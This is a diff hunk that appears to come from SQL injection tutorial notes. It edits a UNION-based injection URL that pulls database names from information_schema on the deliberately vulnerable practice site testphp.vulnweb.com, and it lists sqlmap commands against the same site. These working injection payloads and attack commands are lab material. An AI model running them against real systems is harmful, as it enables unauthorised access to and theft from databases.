@@ -14,7 +14,7 @@ Extract Database Names
 
 Query the information_schema to retrieve database names:
 http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, schema_name, 3 
-FROM information_schema.schemata
+FROM information_schema.schemata --
 
 sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test" or
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" –dbs
